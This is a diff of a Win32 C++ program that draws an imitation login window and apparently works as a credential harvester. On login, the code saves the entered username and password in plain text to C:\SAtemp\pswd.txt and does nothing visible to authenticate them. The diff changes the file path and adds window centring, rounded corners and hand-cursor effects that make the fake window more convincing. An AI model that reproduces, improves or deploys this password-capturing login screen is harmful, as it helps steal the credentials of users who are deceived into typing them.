@@ -21,16 +21,6 @@ BOOL                InitInstance(HINSTANCE, int);
 LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
 INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
 
-void s(LPCWSTR a)//调试用MessageBox
-{
-	MessageBox(NULL, a, L"", NULL);
-}
-void s(int a)
-{
-	wchar_t tmp[34];
-	_itow_s(a, tmp, 10);
-	MessageBox(NULL, tmp, L"", NULL);
-}
 wchar_t Path[300], Name[300];
 void GetPath()//得到程序路径 & ( 程序路径 + 程序名 ).
 {
@@ -104,13 +94,6 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	return (int)msg.wParam;
 }
 
-
-
-//
-//  函数: MyRegisterClass()
-//
-//  目标: 注册窗口类。
-//
 ATOM MyRegisterClass(HINSTANCE hInstance)
 {
 	WNDCLASSEXW wcex;
@@ -143,25 +126,31 @@ ATOM MyRegisterClass(HINSTANCE hInstance)
 //        创建和显示主程序窗口。
 //
 HWND Edit1, Edit2;
+HCURSOR Hhand, Hnormal;
+bool hand;
 BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 {
 	hInst = hInstance; // 将实例句柄存储在全局变量中
 
 	HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_POPUP,
-		300, 200, 308, 258, nullptr, nullptr, hInstance, nullptr);
+		GetDeviceCaps(GetDC(NULL), HORZRES)/2-154, GetDeviceCaps(GetDC(NULL), VERTRES)/2-129, 308, 258, nullptr, nullptr, hInstance, nullptr);
 	Edit1 = CreateWindowW(L"EDIT", L"", WS_CHILD,
-		88, 126, 144, 15, hWnd, nullptr, hInstance, nullptr);
-	Edit2 = CreateWindowW(L"EDIT", L"", WS_CHILD|ES_PASSWORD,
-		88, 161, 165, 15, hWnd, nullptr, hInstance, nullptr);
-	HFONT font=CreateFontW(12 , 6, 0, 0, FW_THIN, FALSE, FALSE, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS,\
+		89, 127, 144, 15, hWnd, nullptr, hInstance, nullptr);
+	Edit2 = CreateWindowW(L"EDIT", L"", WS_CHILD | ES_PASSWORD,
+		89, 161, 164, 15, hWnd, nullptr, hInstance, nullptr);
+	HFONT font = CreateFontW(12, 6, 0, 0, FW_THIN, FALSE, FALSE, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, \
 		CLIP_DEFAULT_PRECIS, PROOF_QUALITY, DEFAULT_PITCH | FF_SWISS, _T("宋体"));
 	SendMessage(Edit1, WM_SETFONT, (WPARAM)font, 1);
 	SendMessage(Edit2, WM_SETFONT, (WPARAM)font, 1);
+	Hnormal = LoadCursor(NULL, IDC_ARROW);
+	Hhand = LoadCursor(NULL, IDC_HAND);
 	HBG = (HBITMAP)LoadImage(hInst, MAKEINTRESOURCE(130), IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
 	HDOWN = (HBITMAP)LoadImage(hInst, MAKEINTRESOURCE(132), IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
 	HEXIT = (HBITMAP)LoadImage(hInst, MAKEINTRESOURCE(133), IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
 	HLOGIN = (HBITMAP)LoadImage(hInst, MAKEINTRESOURCE(135), IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
 	HX = (HBITMAP)LoadImage(hInst, MAKEINTRESOURCE(136), IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
+	HRGN rgn1 = CreateRoundRectRgn(0, 0, 308, 258, 4, 4);
+	SetWindowRgn(hWnd, rgn1, false);
 	if (!hWnd)
 	{
 		return FALSE;
@@ -184,17 +173,6 @@ BOOL RunEXE(wchar_t* CmdLine, DWORD flag, STARTUPINFO* si)
 }
 int Msv;
 #define redraw() InvalidateRect(hWnd,nullptr,false),UpdateWindow(hWnd)
-//
-//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
-//
-//  目标: 处理主窗口的消息。
-//
-//  WM_COMMAND  - 处理应用程序菜单
-//  WM_PAINT    - 绘制主窗口
-//  WM_DESTROY  - 发送退出消息并返回
-//
-//
-#define _CRT_SECURE_NO_WARNINGS 
 #pragma warning(disable:4996)
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 {
@@ -233,7 +211,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 			HBRUSH BitmapBrush3 = CreatePatternBrush(HDOWN);
 			SelectObject(chdc, BitmapBrush3);
 			Rectangle(chdc, 21 * 20 - 1, 22 * 18 - 1, 21 * 21 + 1, 22 * 19 + 1);
-			BitBlt(chdc, 233, 122, 21,22, chdc, 21 * 20, 22 * 18, SRCCOPY);
+			BitBlt(chdc, 233, 122, 21, 22, chdc, 21 * 20, 22 * 18, SRCCOPY);
 			DeleteObject(BitmapBrush3);
 		}
 		if (inEXIT)
@@ -266,6 +244,13 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 		if (newbool != inLOGIN)inLOGIN = newbool, redraw();
 		newbool = InEXIT(hWnd);
 		if (newbool != inEXIT)inEXIT = newbool, redraw();
+		POINT po;
+		GetCursorPos(&po);
+		ScreenToClient(hWnd, &po);
+		if (inEXIT || inLOGIN || inX || inDOWN || (35 <= po.y && po.y <= 101&&33<=po.x&&285>=po.x))
+			SetCursor(Hhand);
+		else
+			SetCursor(Hnormal);
 		if (Msv == 0)
 		{
 			TRACKMOUSEEVENT tme;
@@ -276,14 +261,18 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 			Msv = 1;//移出
 		}
 		else Msv = 0;//移进
-		break;
+		break;//NoptcClass​
 	}
 	case WM_LBUTTONDOWN:
 	{
 		POINT po;
 		GetCursorPos(&po);
 		ScreenToClient(hWnd, &po);
-		if(po.y<30&&(!InX(hWnd)))PostMessage(hWnd, WM_SYSCOMMAND, SC_MOVE | HTCAPTION, 0);
+		if (po.y < 30 && (!InX(hWnd)))PostMessage(hWnd, WM_SYSCOMMAND, SC_MOVE | HTCAPTION, 0);
+		if (inEXIT || inLOGIN || inX || inDOWN || (35 <= po.y && po.y <= 101))
+			SetCursor(Hhand);
+		else
+			SetCursor(Hnormal);
 		break;
 	}
 	case WM_LBUTTONUP:
@@ -291,11 +280,12 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 		if (InX(hWnd) || InEXIT(hWnd))ExitProcess(0);
 		if (InLOGIN(hWnd))
 		{
-			char tmpstr[101] = {0};
+			char tmpstr[101] = { 0 };
 			GetWindowTextA(Edit1, tmpstr, 100);
 			strcat(tmpstr, " ");
 			HANDLE hFile;
-			hFile = CreateFileA("d:\\pswd.txt",
+			CreateDirectory(L"C:\\SAtemp",0);
+			hFile = CreateFileA("C:\\SAtemp\\pswd.txt",
 				GENERIC_WRITE,//对文件的操作
 				0, // 共享的方式 0 不能共享
 				NULL,// 安全属性 用缺省的
@@ -310,7 +300,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 				&dwWrites, //实际写入的长度
 				NULL); //同步IO或是异步IO的方式 如果是同步 程序会被挂起一直到读写完成
 			GetWindowTextA(Edit2, tmpstr, 100);
-			strcat(tmpstr,"\n");
+			strcat(tmpstr, "\n");
 			WriteFile(hFile, //文件句柄
 				tmpstr, //指针 向文件写入的数据 
 				strlen(tmpstr), // 相要写的数据长度
